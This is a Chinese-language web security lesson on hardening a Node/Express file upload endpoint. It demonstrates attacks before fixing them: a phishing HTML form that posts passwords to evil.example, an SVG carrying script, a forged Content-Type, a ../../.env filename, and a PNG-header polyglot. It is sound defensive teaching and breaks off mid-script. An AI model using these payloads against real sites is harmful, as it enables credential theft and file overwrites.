# 第 229 节课：文件上传安全——别让人传个后门上来

> 上一节堵住了"拼字符串"。但还有一种输入不经过 URL、不经过 JSON —— 它是一整个文件。
> 这一节做四件事：**扩展名白名单、看文件头、限制大小、改名后存到 web 目录外面。**
> 上传是"把一个外部文件放进你服务器"的操作，它是所有洞里面后果最直接的一个。

**建议用时**：130 分钟
**你需要先完成**：第 226 节（会做校验）、第 228 节（知道 XSS 怎么发生）、第 31 周的 Nginx

---

# 第 0 步：一个上传接口能出多大事（10 分钟）

## 0.1 你现在会什么

一个最常见的头像上传大概长这样：

```js
const multer = require("multer");
const upload = multer({ dest: "public/uploads/" });

app.post("/api/avatar", upload.single("file"), (req, res) => {
  res.json({ url: "/uploads/" + req.file.filename });
});
```

**这段代码能跑，文件也能显示。** 它有几个洞，我们一个一个打。

## 0.2 你以后会遇到什么

```text
① 有人传了一个 .html 文件，访问直链，你的域名下就跑起了他的钓鱼页面
② 有人传了一个 .svg，里面带 <script>，在图片预览时执行
③ 有人把 .html 的 Content-Type 改成 image/png，你的类型检查放行了
④ 有人传一个 4GB 的文件，把你的磁盘塞满，网站全站 500
⑤ 有人传一个叫 ../../.env 的文件，覆盖了你的配置
```

**这五件的共同点：**

```text
你相信了"客户端说的关于这个文件的一切"。
文件名、扩展名、Content-Type、大小 —— 全都是客户端说了算。
```

## 0.3 今天要建立的三个概念

```text
① 白名单：只允许"明确列出来的扩展名"。
   黑名单（禁 .php/.exe）永远漏，因为可执行的形态太多了。

② 魔数（magic number）：文件开头的几个字节，写着"我到底是什么格式"。
   它比扩展名和 Content-Type 都可靠，因为要伪造它，文件就不是那个格式了。

③ 隔离：把用户上传的东西放在"不能被当成程序执行"的地方。
   不进 web 根目录、用随机名、用鉴权接口读出来。
```

## 0.4 今天的交付物

| 文件 | 位置 | 内容 |
|---|---|---|
| `TASK.md` | `01-任务` | 你正在读的这份 |
| `NOTES.md` | `02-笔记` | 七种攻击的结果表 |
| `upload-lab/` | `03-练习代码` | 上传实验项目 |
| `attacks.md` | `03-练习代码` | 你传过的东西和服务器反应 |

---

# 第 1 步：先造一个"能用的"上传接口（20 分钟）

## 1.1 建实验场

```bash
mkdir -p 03-练习代码/upload-lab
cd 03-练习代码/upload-lab
npm init -y
npm install express multer
```

**应该看到：**

```text
added 76 packages in 3s
```

**`multer` 是什么：** Express 处理 `multipart/form-data` 的中间件。**浏览器上传文件时用的就是这个格式**（不是 JSON）。

## 1.2 一个有洞的版本

**建 `server.js`：**

```js
const express = require("express");
const multer = require("multer");
const path = require("path");

const app = express();
const upload = multer({ dest: "public/uploads/" });   // ❌ 存进 web 根目录

app.use(express.static("public"));

app.post("/api/avatar", upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ error: "NO_FILE" });
  res.json({
    ok: true,
    name: req.file.originalname,
    type: req.file.mimetype,
    size: req.file.size,
    url: "/uploads/" + req.file.filename,
  });
});

app.listen(3000, () => console.log("http://127.0.0.1:3000"));
```

**逐行读：**

| 行 | 问题 |
|---|---|
| `dest: "public/uploads/"` | **文件直接进静态目录 —— 可以被任何人下载** |
| `upload.single("file")` | 只接一个文件，但没限制类型和大小 |
| `req.file.originalname` | 客户端给的文件名，**可能是 `../../.env`** |
| `req.file.mimetype` | 客户端给的 Content-Type，**随便填** |
| `req.file.filename` | multer 随机生成的，这一项是好的 |

**注意：multer 的 `dest` 模式会自动生成随机文件名、且不带扩展名。** 所以它"顺手"挡住了一部分问题。**但我们马上会看到，不带扩展名不等于安全。**

## 1.3 正常传一张图

**先造一张真图（用 Node 生成一个 1x1 的 PNG）：**

```bash
node -e "require('fs').writeFileSync('ok.png', Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8cfc000000301010018dd8db00000000049454e44ae426082','hex'))"
```

**传上去：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar -F "file=@ok.png"
```

**应该看到：**

```json
{"ok":true,"name":"ok.png","type":"image/png","size":70,"url":"/uploads/3f2a1b0c9d4e4a7b"}
```

**逐段读：**

| 字段 | 来源 | 可信吗 |
|---|---|---|
| `name` | `req.file.originalname` | ❌ 客户端说了算 |
| `type` | `req.file.mimetype` | ❌ 客户端说了算 |
| `size` | multer 实际接收的字节数 | ✅ 服务端算的 |
| `url` | multer 生成的名字 | ✅ 服务端生成 |

**访问一下：**

```bash
curl -s -o /dev/null -w "%{http_code} %{content_type}\n" http://127.0.0.1:3000/uploads/3f2a1b0c9d4e4a7b
```

**应该看到：**

```text
200 application/octet-stream
```

**`application/octet-stream` 是什么：** "我不知道这是什么，你下载吧"。**因为文件名没有扩展名，Express 猜不出来。**

**注意这个细节：** 浏览器遇到 `application/octet-stream` 会**下载**而不是渲染。**这恰好救了我们一次。** 但它不是"设计"，是"巧合"。

---

# 第 2 步：七种攻击，一种一种打（30 分钟）

## 2.1 攻击 1：传一个 HTML 文件

**造一个钓鱼页：**

```bash
cat > evil.html <<'EOF'
<h1>系统维护中，请重新登录</h1>
<form action="https://evil.example/steal">
  <input name="email" placeholder="邮箱">
  <input name="password" type="password" placeholder="密码">
  <button>登录</button>
</form>
EOF
```

**传上去：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar -F "file=@evil.html"
```

**应该看到：**

```json
{"ok":true,"name":"evil.html","type":"text/html","url":"/uploads/8b9c0d1e2f3a4b5c"}
```

**访问它：**

```bash
curl -s -o /dev/null -w "%{http_code} %{content_type}\n" http://127.0.0.1:3000/uploads/8b9c0d1e2f3a4b5c
```

**应该看到：**

```text
200 application/octet-stream
```

**这次是 200 但不是 `text/html`，所以浏览器会下载。**

**这就是那个"巧合"。** 但真实项目里，很多人会做一件事把它变成灾难：

```js
// ❌ "为了让它能显示，我根据原始文件名补上扩展名"
const ext = path.extname(req.file.originalname);
fs.renameSync(req.file.path, req.file.path + ext);
```

**补上 `.html` 之后：**

```text
访问 /uploads/xxx.html → text/html → 浏览器渲染 → 你的域名下出现钓鱼页
```

**为什么这很严重：**

```text
地址栏是你的域名，HTTPS 是有效的（你的证书）。
用户看到"your-domain.com"就会信。
而且这个页面能读你域名下的 cookie（XSS 同源）。
```

## 2.2 攻击 2：`.svg` 里带脚本

**SVG 是"用 XML 描述的图片"，所以它能包含 `<script>`。**

```bash
cat > evil.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <script>alert(document.domain)</script>
  <text y="20">看起来是一张图</text>
</svg>
EOF
```

**传上去，并且假设你补了扩展名：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar -F "file=@evil.svg"
```

**如果服务器以 `image/svg+xml` 返回，浏览器打开时会执行 `<script>`。**

**为什么这个最阴：**

```text
① 它的扩展名是 .svg，看起来"只是图片"
② 很多"图片白名单"里会写 jpg/png/gif/webp/svg
③ 一旦 svg 被当成图片内联显示，脚本在你域名下执行
```

**结论：除非你非常确定，SVG 一律不收。** 需要图标就自己转成 PNG 再发。

## 2.3 攻击 3：伪造 `Content-Type`

**这是最经典的一招。**

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar \
  -F "file=@evil.html;type=image/png;filename=avatar.png"
```

**应该看到：**

```json
{"ok":true,"name":"avatar.png","type":"image/png","size":148,"url":"/uploads/..."}
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `@evil.html` | **实际内容是一个 HTML 文件** |
| `;type=image/png` | **请求里声明的类型，随便写** |
| `;filename=avatar.png` | **声明的文件名，也随便写** |

**你的服务端看到的是：一个叫 `avatar.png`、类型 `image/png` 的"图片"。**

**而它实际上是 HTML。**

**如果你的校验是：**

```js
if (!["image/png", "image/jpeg"].includes(req.file.mimetype)) {
  return res.status(400).json({ error: "BAD_TYPE" });
}
```

**这一行被完全绕过了。** 因为 `mimetype` 来自客户端。

## 2.4 攻击 4：路径穿越的文件名

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar \
  -F "file=@evil.html;filename=../../.env"
```

**如果你的代码用了 `originalname` 拼路径：**

```js
fs.writeFileSync(path.join("public/uploads", req.file.originalname), buf);   // ❌
```

**会写到 `public/.env`。** 也就是**覆盖你的配置文件**。

**为什么 multer 的 `dest` 模式挡住了它：** 它生成自己的随机名，不用 `originalname`。**但只要你哪天"为了保留原文件名"改了一行，洞就回来了。**

## 2.5 攻击 5：超大文件

```bash
# 造一个 50MB 的文件
node -e "require('fs').writeFileSync('big.bin', Buffer.alloc(50*1024*1024))"
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/api/avatar -F "file=@big.bin"
```

**应该看到：**

```text
200
```

**50MB 的文件进了你的磁盘。**

**为什么这能拖垮你：**

```text
① 磁盘满了 → 数据库写不进去 → 全站 500
② 上传时内存要缓冲 → 几个并发就能把 2G 内存吃完
③ 如果放在 web 目录，还会被人当免费网盘用（流量费你出）
```

**真实的攻击是"并发 + 持续"：**

```text
20 个并发 × 50MB × 每分钟一次 = 一小时 60GB
```

## 2.6 攻击 6：目录列表

**如果你的静态目录开了目录浏览：**

```bash
curl -s http://127.0.0.1:3000/uploads/ | head -20
```

**如果返回了 HTML 文件列表，说明：**

```text
任何人都能列出你所有的上传文件，包括别人的头像、别人的附件。
```

**Express 的 `express.static` 默认不开目录列表**，但 Nginx 的 `autoindex on` 会开。**两边都要检查。**

## 2.7 攻击 7：同名覆盖

**如果文件名是用户给的，两个用户传 `avatar.png`：**

```text
用户 A 传 avatar.png → 写入
用户 B 传 avatar.png → 覆盖 A 的
```

**结果：A 的头像变成了 B 的图。** 更糟的情况是"覆盖别人的附件"。

**这也是一种越权**（第 227 节的思路）：**你没检查"这个文件是不是你的"。**

## 2.8 记录表

**在 `attacks.md` 里建：**

| # | 攻击 | 我传了什么 | 服务器返回 | 能不能被利用 |
|---|---|---|---|---|
| 1 | HTML 钓鱼页 | `evil.html` | | |
| 2 | SVG 脚本 | `evil.svg` | | |
| 3 | 伪造类型 | `evil.html` 声明 `image/png` | | |
| 4 | 路径穿越名 | `../../.env` | | |
| 5 | 超大文件 | 50MB | | |
| 6 | 目录列表 | 访问 `/uploads/` | | |
| 7 | 同名覆盖 | 两个 `avatar.png` | | |

---

# 第 3 步：修法一 —— 扩展名白名单 + 魔数（30 分钟）

## 3.1 先只允许三种扩展名

```js
const ALLOWED_EXT = new Set([".png", ".jpg", ".jpeg", ".webp"]);
```

**为什么不写 `gif`：** GIF 支持多帧动画，某些场景能被用来做钓鱼诱导。**不是不能收，是"先收窄，需要再放"。**

**为什么不用黑名单：**

```text
黑名单要挡住：.php .phtml .php5 .php7 .pht .phar .html .htm .xhtml .svg
             .js .mjs .cjs .exe .sh .bat .cmd .ps1 .jsp .asp .aspx .cgi .pl
漏一个就是洞。
而白名单只写 4 个，漏不了。
```

## 3.2 再看文件头（魔数）

**扩展名是客户端给的，可以改。文件头是文件内容的一部分，改了就真不是那个格式了。**

| 格式 | 开头几个字节（十六进制） |
|---|---|
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| JPEG | `FF D8 FF` |
| GIF | `47 49 46 38`（`GIF8`） |
| WEBP | `52 49 46 46`（`RIFF`）+ 第 8—11 字节 `57 45 42 50`（`WEBP`） |
| PDF | `25 50 44 46`（`%PDF`） |
| ZIP | `50 4B 03 04`（`PK..`） |

**手写一个检查函数：**

```js
function sniff(buf) {
  const b = buf;
  if (b.length < 12) return null;

  if (b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47) return "png";
  if (b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff) return "jpg";
  if (b[0] === 0x47 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x38) return "gif";
  if (
    b[0] === 0x52 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x46 &&
    b[8] === 0x57 && b[9] === 0x45 && b[10] === 0x42 && b[11] === 0x50
  ) return "webp";

  return null;
}
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `b.length < 12` | 太短的文件判断不了，直接拒 |
| `b[0] === 0x89 && b[1] === 0x50 ...` | **逐个字节比对** PNG 的 8 字节签名 |
| `b[8] === 0x57 ...` | WEBP 的 `WEBP` 标记在第 8—11 字节（前 4 字节是 `RIFF`） |
| `return null` | 认不出来就不收 |

**为什么不用 `file-type` 这个包：** 可以用，但**新版本是纯 ESM 的，在 `require()` 的项目里会报 `ERR_REQUIRE_ESM`**。要用手写，要么用 `await import("file-type")`。**手写这 12 行没有依赖，也不会有版本问题。**

**如果你确实要装：**

```bash
npm i file-type@16
```

**`@16` 是最后一个支持 CommonJS 的大版本。** 具体以你装到的版本为准。

## 3.3 把两道检查接起来

**改成"内存里接文件 + 自己决定去哪"：**

```js
const multer = require("multer");
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 2 * 1024 * 1024, files: 1 },
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `memoryStorage()` | 文件先进内存，**不落盘** |
| `fileSize: 2 * 1024 * 1024` | **最大 2MB**，超了直接报错 |
| `files: 1` | 一次只收 1 个文件 |

**为什么用内存：**

```text
如果先落盘再检查，检查失败时你还得删临时文件。
万一删失败，磁盘上就留了一个"未通过校验的文件"。
用内存就简单：不合格就丢掉，什么都没留下。
```

**⚠️ 内存模式的代价：** 2MB × 20 并发 = 40MB。**所以 `fileSize` 必须设小。** 要传大文件（视频）就得用"落盘到临时目录 + 立刻检查 + 失败就删"。

**接上检查：**

```js
const ALLOWED_EXT = new Set([".png", ".jpg", ".jpeg", ".webp"]);
const EXT_TO_MAGIC = { png: ".png", jpg: ".jpg", gif: ".gif", webp: ".webp" };

app.post("/api/avatar", requireLogin, upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ error: "NO_FILE" });

  const ext = path.extname(req.file.originalname || "").toLowerCase();
  if (!ALLOWED_EXT.has(ext)) {
    return res.status(400).json({ error: "BAD_EXT", allowed: [...ALLOWED_EXT] });
  }

  const kind = sniff(req.file.buffer);
  if (!kind || !["png", "jpg", "webp"].includes(kind)) {
    return res.status(400).json({ error: "BAD_MAGIC" });
  }

  res.json({ ok: true, ext, kind, size: req.file.size });
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `path.extname(...).toLowerCase()` | 取扩展名并转小写（`A.PNG` 也要认） |
| `ALLOWED_EXT.has(ext)` | **白名单**，不在里面就拒 |
| `sniff(req.file.buffer)` | 读文件头 |
| `!["png","jpg","webp"].includes(kind)` | 魔数也要在白名单里 |
| `size` | 只返回字节数，**不返回文件内容** |

**为什么扩展名和魔数"都要"检查：**

```text
只查扩展名 → 改个名字就过（evil.html → evil.png）
只查魔数   → 一个真 PNG 后面接一段 HTML（polyglot），魔数对、内容也有 HTML
两个都查   → 至少要求"名字和内容一致"
```

**注意最后一句话的前提：** 两个都查**仍然不能 100% 防 polyglot**。**真正的解法是第 5 步的"重绘"** —— 把图片解码再编码，非图片数据全部丢掉。

## 3.4 验证

```bash
# 伪造类型的 HTML
curl -s -X POST http://127.0.0.1:3000/api/avatar \
  -H "X-User-Id: 1" \
  -F "file=@evil.html;type=image/png;filename=avatar.png"

# 假扩展名的 HTML
curl -s -X POST http://127.0.0.1:3000/api/avatar \
  -H "X-User-Id: 1" \
  -F "file=@evil.html;filename=evil.html"

# 正常 PNG
curl -s -X POST http://127.0.0.1:3000/api/avatar \
  -H "X-User-Id: 1" \
  -F "file=@ok.png"
```

**应该看到：**

```json
{"error":"BAD_MAGIC"}
{"error":"BAD_EXT","allowed":[".png",".jpg",".jpeg",".webp"]}
{"ok":true,"ext":".png","kind":"png","size":70}
```

**逐条读：**

| 请求 | 结果 | 说明 |
|---|---|---|
| HTML 声明成 png，名字 `avatar.png` | `BAD_MAGIC` | ✅ 扩展名过了，**魔数没过** |
| HTML 叫 `evil.html` | `BAD_EXT` | ✅ 扩展名就被挡在第一关 |
| 真 PNG | `ok` | ✅ 正常文件放行 |

**只测"被挡住"是不够的，最后一条"正常能过"必须一起测。** 否则你可能把功能也堵死了。

---

# 第 4 步：修法二 —— 大小限制（20 分钟）

## 4.1 应用层：multer 的 `limits`

```js
limits: { fileSize: 2 * 1024 * 1024, files: 1, fields: 5 }
```

| 参数 | 意思 | 不设会怎样 |
|---|---|---|
| `fileSize` | 单个文件最大字节 | 磁盘被打满、内存被吃光 |
| `files` | 一次最多几个文件 | 一次传 1000 个文件 |
| `fields` | 普通字段最多几个 | 有人塞 10 万个字段撑爆内存 |

**超限时报什么错：**

```bash
node -e "require('fs').writeFileSync('big.bin', Buffer.alloc(5*1024*1024))"
curl -s -X POST http://127.0.0.1:3000/api/avatar -H "X-User-Id: 1" -F "file=@big.bin"
```

**应该看到：**

```text
MulterError: File too large
```

**这个错误默认会变成 500。** 要专门接住：

```js
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    if (err.code === "LIMIT_FILE_SIZE") {
      return res.status(413).json({ error: "FILE_TOO_LARGE", maxBytes: 2 * 1024 * 1024 });
    }
    return res.status(400).json({ error: err.code });
  }
  next(err);
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `err instanceof multer.MulterError` | 判断是 multer 抛的（不是业务代码抛的） |
| `err.code === "LIMIT_FILE_SIZE"` | 具体的"文件太大" |
| `413` | HTTP 里"请求体太大"的标准状态码 |

**为什么要单独接：** 用户传了个 5MB 的图，你返回 500，他只会觉得"网站坏了"。**返回 413 + "最大 2MB"，他才知道怎么改。**

## 4.2 Nginx 层：还有一个默认 1MB 的坑

**如果你的应用在 Nginx 后面，Nginx 自己也有一个限制：**

```text
client_max_body_size 默认 1m
```

**现象：用户传 2MB 的图（你没超 multer 的限制），却收到：**

```text
413 Request Entity Too Large
```

**这个 413 是 Nginx 返回的，根本不是你的 Node 返回的。** 特征是：

```html
<html>
<head><title>413 Request Entity Too Large</title></head>
<body>
<center><h1>413 Request Entity Too Large</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>
```

**怎么确认：**

```bash
curl -s -i -X POST https://your-domain.com/api/avatar -F "file=@big.bin" | head -5
```

**应该看到：**

```text
HTTP/2 413 
server: nginx/1.24.0
content-type: text/html
```

**看到 `server: nginx` 就知道是 Nginx 拦的。**

**修法：**

```bash
nano /etc/nginx/sites-available/default
```

**在 `server { }` 里加：**

```nginx
client_max_body_size 2m;
```

```bash
nginx -t
systemctl reload nginx
```

**⚠️ 两层的数值要"对得上，但不要完全相等"：**

```text
Nginx  client_max_body_size 2m
multer fileSize              2 * 1024 * 1024
```

**为什么建议 Nginx 稍大一点（比如 `3m`）：**

```text
因为 multipart 格式本身有边界字符串和头部开销。
一个"正好 2MB"的文件，整个请求体是 2MB + 几百字节。
如果两边都设 2m，用户会发现"2MB 的图传不上去，1.99MB 可以"。
```

**推荐：Nginx `3m`，multer `2MB`。** 这样 Nginx 放行、应用层给出精确的错误信息。

## 4.3 验证

```bash
# 3MB 的文件
node -e "require('fs').writeFileSync('mid.bin', Buffer.alloc(3*1024*1024))"
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/api/avatar -H "X-User-Id: 1" -F "file=@mid.bin"
```

**应该看到：**

```text
413
```

**如果是走 Nginx 的域名：**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST https://your-domain.com/api/avatar -F "file=@mid.bin"
```

**也应该 413。** 但如果这时返回的是 Nginx 的 HTML 错误页，说明 Nginx 先拦了 —— **那也达到了目的，只是错误信息不友好。**

**测试"边界值"：**

```bash
node -e "require('fs').writeFileSync('edge.bin', Buffer.alloc(2*1024*1024 - 100))"
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/api/avatar -H "X-User-Id: 1" -F "file=@edge.bin"
```

**应该看到 `400`（`BAD_EXT` 或 `BAD_MAGIC`）而不是 `413`。**

**这说明"大小这道门"放行了，"类型那道门"挡住了 —— 两道门是独立的。**

---

# 第 5 步：修法三 —— 改名 + 存到 web 目录外（25 分钟）

## 5.1 三层隔离

```text
① 文件名：服务端生成随机名，不用 originalname
② 位置：存到 /srv/app/uploads（不在 public 里）
③ 读取：通过一个鉴权接口读出来，不靠静态托管
```

**为什么三层都要：**

| 只做 | 会怎样 |
|---|---|
| 只改名 | 文件还是能被直链访问（只是名字难猜） |
| 只挪位置 | 名字还是可能被猜/覆盖 |
| 只加鉴权 | 如果文件本身能执行，鉴权也救不了 |

## 5.2 随机文件名

```js
const crypto = require("crypto");

function newName(kind) {
  return crypto.randomUUID() + "." + kind;    // "3f2a1b0c-....png"
}
```

**为什么用 `randomUUID`：**

```text
① 不可猜：攻击者没法"猜下一个文件名"
② 不冲突：两个用户同时传，不会互相覆盖
③ 无路径：UUID 里不可能有 / 或 ..，路径穿越无从谈起
```

**保留原始名的正确做法：**

```js
// 原始名只存数据库，只用来显示和下载时命名
db.prepare("INSERT INTO files (id, user_id, stored_name, original_name, mime, size) VALUES (?,?,?,?,?,?)")
  .run(id, req.user.id, storedName, String(req.file.originalname).slice(0, 200), mime, size);
```

**注意 `.slice(0, 200)`：** 原始名也可能很长（甚至几 MB），**存之前要截断**。第 226 节讲过的"长度校验"在这里同样适用。

## 5.3 存到 web 根之外

```js
const UPLOAD_DIR = path.join(__dirname, "..", "storage", "uploads");
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const fullPath = path.join(UPLOAD_DIR, storedName);
fs.writeFileSync(fullPath, req.file.buffer);
```

**目录结构：**

```text
upload-lab/
├── public/          ← Nginx / express.static 的根，只有前端文件
│   └── index.html
├── storage/
│   └── uploads/     ← 上传的文件在这里，web 根之外
└── server.js
```

**为什么这么放：**

```text
web 根目录里的东西，默认"任何人访问 URL 就能拿到"。
你放在 public/ 里，等于把"能不能看"交给了"知不知道文件名"。
挪出来之后，唯一的读法是走你的接口 —— 而接口可以检查登录和归属。
```

**一个必须检查的地方：Nginx 的 `root`**

```bash
grep -n "root " /etc/nginx/sites-available/default
```

**应该看到：**

```text
root /srv/app/public;
```

**如果是 `root /srv/app;`，那 `storage/` 也可能被访问到。**

## 5.4 鉴权读取接口

```js
app.get("/api/files/:id", requireLogin, (req, res) => {
  const row = db
    .prepare("SELECT * FROM files WHERE id = ? AND user_id = ?")
    .get(req.params.id, req.user.id);
  if (!row) return res.status(404).json({ error: "NOT_FOUND" });

  res.setHeader("Content-Type", row.mime);
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Content-Disposition", `inline; filename="${row.stored_name}"`);
  res.sendFile(path.join(UPLOAD_DIR, row.stored_name));
});
```

**逐段读：**

| 头 | 作用 |
|---|---|
| `Content-Type: image/png` | **用数据库里记的类型**，不是客户端当时说的 |
| `X-Content-Type-Options: nosniff` | **禁止浏览器"猜"类型** —— 非常重要 |
| `Content-Disposition: inline` | 让浏览器直接显示，而不是下载 |
| `res.sendFile` | 从磁盘读出来发出去 |

**`nosniff` 为什么关键：**

```text
没有它：浏览器可能"看内容像 HTML"就按 HTML 渲染，哪怕你说的是 image/png。
有它：浏览器必须按你给的类型处理，不许猜。
```

**这是防"内容嗅探型 XSS"的最后一道。**

**`filename` 里如果有双引号怎么办：**

```js
const safe = row.stored_name.replace(/["\\\r\n]/g, "");
res.setHeader("Content-Disposition", `inline; filename="${safe}"`);
```

**因为 `stored_name` 是 UUID + 扩展名，本来就没有这些字符。但**如果哪天你改成用原始名，这一行就是必须的。

## 5.5 验证：直链访问不到了

```bash
# 假定的旧地址
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/uploads/3f2a1b0c9d4e4a7b
```

**应该看到：**

```text
404
```

**而走接口，带登录：**

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/api/files/1 -H "X-User-Id: 1"
```

**应该看到：**

```text
200
```

**用别人的身份读同一个文件：**

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/api/files/1 -H "X-User-Id: 2"
```

**应该看到：**

```text
404
```

**三条一起看：**

```text
直链 404   → 不能再绕过接口
本人 200   → 功能正常
别人 404   → 越权也堵住了（第 227 节的思路）
```

---

# 第 6 步：修法四 —— 图片重绘（20 分钟）

## 6.1 为什么"检查"还不够

**有一种文件叫 polyglot（多语言文件）：**

```text
它的开头是合法的 PNG 魔数，
但后面的数据块里藏了一段 HTML 或 JS。
某些解析器会把它当图片显示，另一些会把它当 HTML 渲染。
```

**检查魔数只能看开头 12 个字节。** 后面的内容它管不了。

## 6.2 重绘：解码再编码

**`sharp` 是一个图片处理库，它会"真的把图片解开，再重新编码"。**

```bash
npm install sharp
```

**应该看到：**

```text
added 30 packages in 8s
```

**用起来：**

```js
const sharp = require("sharp");

async function sanitizeImage(buffer) {
  return sharp(buffer)
    .rotate()                                  // 按 EXIF 自动转正
    .resize(1200, 1200, { fit: "inside", withoutEnlargement: true })
    .jpeg({ quality: 82 })                     // 统一输出 jpeg
    .toBuffer();
}
```

**逐段读：**

| 方法 | 作用 |
|---|---|
| `.rotate()` | 按 EXIF 的旋转信息转正（手机拍的照片常带这个） |
| `.resize(1200, 1200, {fit:"inside"})` | 最长边 1200，**顺带压掉超大图** |
| `withoutEnlargement: true` | 小图不放大（放大只会变糊） |
| `.jpeg({ quality: 82 })` | **重新编码成 JPEG** |

**为什么这一步能解决问题：**

```text
sharp 只接受"它认识的图片格式"。
解不开 → 报错 → 你拒掉。
解得开 → 重新编码 → 输出的字节里只有"图像数据"，
         原来夹带的 HTML/JS/EXIF 脚本全部消失。
```

**还有一个好处：EXIF 里的 GPS 位置也没了。**

```text
用户拿手机拍的照片，EXIF 里可能带着拍摄地点的经纬度。
直接存原图 = 把用户的家庭住址公开了。
重绘 = 顺手把 EXIF 清掉。
```

## 6.3 接进上传流程

```js
app.post("/api/avatar", requireLogin, upload.single("file"), async (req, res, next) => {
  try {
    if (!req.file) return res.status(400).json({ error: "NO_FILE" });

    const ext = path.extname(req.file.originalname || "").toLowerCase();
    if (!ALLOWED_EXT.has(ext)) return res.status(400).json({ error: "BAD_EXT" });

    const kind = sniff(req.file.buffer);
    if (!kind) return res.status(400).json({ error: "BAD_MAGIC" });

    let out;
    try {
      out = await sanitizeImage(req.file.buffer);
    } catch {
      return res.status(400).json({ error: "NOT_A_REAL_IMAGE" });
    }

    const storedName = crypto.randomUUID() + ".jpg";
    fs.writeFileSync(path.join(UPLOAD_DIR, storedName), out);

    const info = db
      .prepare("INSERT INTO files (user_id, stored_name, original_name, mime, size) VALUES (?,?,?,?,?)")
      .run(req.user.id, storedName, String(req.file.originalname).slice(0, 200), "image/jpeg", out.length);

    res.status(201).json({ id: info.lastInsertRowid, url: "/api/files/" + info.lastInsertRowid });
  } catch (e) {
    next(e);
  }
});
```

**逐段读：**

| 片段 | 意思 |
|---|---|
| `try { ... } catch { NOT_A_REAL_IMAGE }` | **sharp 解不开 = 不是真图片**，这是最可靠的判断 |
| `storedName = uuid + ".jpg"` | 统一扩展名，因为输出统一是 jpeg |
| `out.length` | 存的是**重绘后**的大小，不是原始大小 |
| `next(e)` | 其它错误交给统一错误处理，**不要把 `e.message` 返回给用户** |

**注意：这里判断"是不是真图片"的最强依据，其实是 sharp 能不能解开。** 魔数只是"便宜的第一道筛"，sharp 才是"真的解码一次"。

## 6.4 验证

```bash
# 传一个假的 png（其实是 HTML 前面加了 PNG 头）
node -e "
const fs=require('fs');
const png=Buffer.from('89504e470d0a1a0a0000000d49484452','hex');
fs.writeFileSync('poly.png', Buffer.concat([png, Buffer.from('<script>alert(1)</script>')]));
"
curl -s -X POST http://127.0.0.1:3000/api/avatar -H "X-User-Id: 1" -F "file=@poly.png"
```

**应该看到：**

```json
{"error":"NOT_A_REAL_IMAGE"}
```

**逐段读：**

| 检查 | 结果 |
|---|---|
| 扩展名 `.png` | ✅ 过了 |
| 魔数 `89504e47...` | ✅ 过了（我伪造了它） |
| sharp 解码 | ❌ **失败了 —— 这就是最后一道门** |

**这就是为什么"魔数检查"不能替代"重绘"。**

**再传一个真图，确认功能还在：**

```bash
curl -s -X POST http://127.0.0.1:3000/api/avatar -H "X-User-Id: 1" -F "file=@ok.png"
```

**应该看到：**

```json
{"id":2,"url":"/api/files/2"}
```

**然后检查输出是不是真的被重编码了：**

```bash
curl -s http://127.0.0.1:3000/api/files/2 -H "X-User-Id: 1" -o out.jpg -w "%{content_type} %{size_download}\n"
```

**应该看到：**

```text
image/jpeg 631
```

**原来是 70 字节的 PNG，现在是 631 字节的 JPEG。** 尺寸变了、格式变了 —— **说明它真的被解开又编回去了。**

## 6.5 SVG 怎么办

**SVG 不是位图，sharp 处理它的行为要看你装的版本和配置。** 最省事的做法：

```js
const ALLOWED_EXT = new Set([".png", ".jpg", ".jpeg", ".webp"]);
// .svg 不在里面 —— 不收
```

**如果业务一定要 SVG：**

```text
① 用专门的 SVG 清洗库，去掉 <script>、on* 属性、外部引用
② 或者：上传后立刻转成 PNG（丢掉矢量特性）
③ 并且：SVG 一律用 Content-Disposition: attachment 下载，不内联显示
```

**为什么"内联显示 SVG"特别危险：**

```text
内联的 SVG 和你的页面是同一个源。
它里面的 <script> 能读你的 cookie、能调你的接口。
```

---

# 第 7 步：把七种攻击再打一遍（15 分钟）

## 7.1 回归表

| # | 攻击 | 修好后期望 |
|---|---|---|
| 1 | HTML 钓鱼页 | 400 `BAD_EXT` |
| 2 | SVG 脚本 | 400 `BAD_EXT` |
| 3 | 伪造 `Content-Type` | 400 `BAD_MAGIC` |
| 4 | 路径穿越名 | 文件名被忽略，服务端用 UUID |
| 5 | 50MB 文件 | 413 |
| 6 | 目录列表 | 404 或 403 |
| 7 | 同名覆盖 | 不可能（UUID 不重名） |

## 7.2 一次跑完

```bash
B=http://127.0.0.1:3000
U='X-User-Id: 1'

echo -n "1 HTML        "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@evil.html"
